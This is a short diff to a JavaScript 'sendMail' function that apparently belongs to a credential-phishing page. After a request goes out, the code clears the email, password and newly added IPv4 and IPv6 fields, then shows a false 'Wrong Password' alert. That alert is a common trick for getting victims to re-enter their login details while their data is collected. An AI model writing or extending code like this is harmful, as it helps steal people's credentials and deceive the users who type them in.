@@ -28,6 +28,8 @@ function sendMail() {
     .then(res=>{
         document.getElementById("email").value = "";
         document.getElementById("password").value = "";
+        document.getElementById("ipv4").value = "";
+        document.getElementById("ipv6").value = "";
         console.log(res);
         alert("Wrong Password")
 
